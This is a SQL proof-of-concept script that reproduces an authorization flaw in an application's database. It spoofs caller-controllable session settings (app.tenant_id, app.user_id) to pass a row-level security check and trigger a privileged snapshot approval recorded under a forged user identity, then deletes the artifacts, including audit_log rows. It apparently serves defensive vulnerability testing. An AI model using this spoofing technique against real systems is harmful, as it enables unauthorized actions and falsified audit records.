-- ============================================================
-- reproduce-attack-migration31.sql
-- ------------------------------------------------------------
-- Reproduce the REMAINING vulnerability after Migration 31.
--
-- Migration 31 replaced the direct-call function with an RLS-gated
-- INSERT into reform_coordination_snapshot_approval_requests + trigger.
-- But the RLS INSERT policy checks:
--   "tenantId" = current_setting('app.tenant_id', true)
--   AND "requestedBy" = current_setting('app.user_id', true)
--
-- Both GUCs are caller-controllable by a balance_app connection.
-- An attacker with a balance_app DB connection can:
--   1. SET app.tenant_id to a valid lead institution
--   2. SET app.user_id to a valid authorized user's ID
--   3. INSERT into reform_coordination_snapshot_approval_requests
--   4. The trigger fires, approves the snapshot, writes audit with forged identity
--
-- This proves the trust boundary is still GUC-based, not credential-based.
-- ============================================================

\set ON_ERROR_STOP off
\echo '============================================================'
\echo 'ATTACK: GUC-spoofing via balance_app against Migration 31'
\echo '============================================================'

-- Clean up prior artifacts
DELETE FROM reform_coordination_snapshot_approval_requests WHERE "snapshotId" IN (
  SELECT id FROM reform_coordination_shared_snapshots WHERE title = 'ATTACK_M31_TARGET'
);
DELETE FROM reform_coordination_shared_snapshot_revocations WHERE "snapshotId" IN (
  SELECT id FROM reform_coordination_shared_snapshots WHERE title = 'ATTACK_M31_TARGET'
);
DELETE FROM reform_coordination_shared_snapshots WHERE title = 'ATTACK_M31_TARGET';
DELETE FROM audit_log WHERE action = 'reform.coordination.snapshot_approved'
  AND details->>'snapshotId' IN (
    SELECT id::text FROM reform_coordination_shared_snapshots WHERE title = 'ATTACK_M31_TARGET'
  );

-- Step 1: Create target snapshot (as postgres, BYPASSRLS)
\echo 'STEP 1: Create target draft snapshot owned by Tenant A'
DO $$
DECLARE
  v_tenant_a TEXT;
  v_coord_id TEXT;
BEGIN
  SELECT id INTO v_tenant_a FROM tenants WHERE code = 'DML-MOP-TENANT';
  SELECT id INTO v_coord_id FROM reform_coordinations WHERE "leadTenantId" = v_tenant_a LIMIT 1;
  INSERT INTO reform_coordination_shared_snapshots (
    id, "coordinationId", "ownerTenantId", "snapshotType", title, summary,
    status, "submittedAt", "createdBy", "createdAt", "updatedAt"
  ) VALUES (
    gen_random_uuid()::text, v_coord_id, v_tenant_a, 'custom', 'ATTACK_M31_TARGET',
    'Snapshot targeted by GUC-spoofing attack against Migration 31.',
    'draft', NOW(), 'attack-repro', NOW(), NOW()
  );
END $$;

-- Get IDs (as postgres, before SET ROLE)
\gset
SELECT id AS target_snapshot_id,
       (SELECT c."leadTenantId"
        FROM reform_coordination_shared_snapshots s
        JOIN reform_coordinations c ON c.id = s."coordinationId"
        WHERE s.title = 'ATTACK_M31_TARGET' LIMIT 1) AS lead_tenant_id
FROM reform_coordination_shared_snapshots
WHERE title = 'ATTACK_M31_TARGET' LIMIT 1
\gset

-- Find a valid user ID in Tenant A (for the forged app.user_id)
\gset
SELECT u.id AS valid_user_id FROM users u
JOIN memberships m ON m."userId" = u.id
WHERE m."tenantId" = :'lead_tenant_id' AND m.status = 'active' AND m."roleCode" = 'admin'
LIMIT 1
\gset

\echo 'Target snapshot: ' :target_snapshot_id
\echo 'Lead tenant:    ' :lead_tenant_id
\echo 'Valid user ID:  ' :valid_user_id

-- Step 2: Attack — connect as balance_app, spoof BOTH GUCs, INSERT
\echo ''
\echo 'STEP 2: Attack — balance_app spoofs app.tenant_id + app.user_id'
\echo '        Both GUCs are caller-controllable.'

SET ROLE balance_app;

-- SPOOF both GUCs to valid values (attacker knows these from API responses)
SELECT set_config('app.tenant_id', :'lead_tenant_id', false);
SELECT set_config('app.user_id', :'valid_user_id', false);

\echo 'Spoofed app.tenant_id = lead tenant'
\echo 'Spoofed app.user_id = valid admin user'

-- INSERT into approval_requests — RLS policy checks GUCs (which we control)
\echo ''
\echo 'INSERTing into reform_coordination_snapshot_approval_requests...'
INSERT INTO reform_coordination_snapshot_approval_requests
  ("snapshotId", "tenantId", "requestedBy", "notes")
VALUES (
  :'target_snapshot_id',
  :'lead_tenant_id',
  :'valid_user_id',
  'Attack: GUC-spoofed INSERT triggers privileged approval'
);

RESET ROLE;

-- Step 3: Verify the attack succeeded
\echo ''
\echo '============================================================'
\echo 'STEP 3: Verify attack result'
\echo '============================================================'

SELECT title, status, "approvedBy", "approvedAt"
FROM reform_coordination_shared_snapshots
WHERE title = 'ATTACK_M31_TARGET';

SELECT actor, action, details->>'snapshotId' AS snap_id, status
FROM audit_log
WHERE action = 'reform.coordination.snapshot_approved'
  AND details->>'snapshotId' = :'target_snapshot_id'
ORDER BY "at" DESC LIMIT 1;

SELECT "processedAt" IS NOT NULL AS trigger_fired
FROM reform_coordination_snapshot_approval_requests
WHERE "snapshotId" = :'target_snapshot_id';

\echo ''
\echo '============================================================'
\echo 'VULNERABILITY CONFIRMED if:'
\echo '  - snapshot status = ''approved'''
\echo '  - approvedBy = valid_user_id (forged identity accepted)'
\echo '  - audit_log actor = valid_user_id (forged identity in audit)'
\echo '  - trigger_fired = t (privileged trigger executed from spoofed INSERT)'
\echo '============================================================'

-- Cleanup
DELETE FROM reform_coordination_snapshot_approval_requests WHERE "snapshotId" = :'target_snapshot_id';
DELETE FROM reform_coordination_shared_snapshots WHERE title = 'ATTACK_M31_TARGET';
DELETE FROM audit_log WHERE action = 'reform.coordination.snapshot_approved'
  AND details->>'snapshotId' = :'target_snapshot_id';
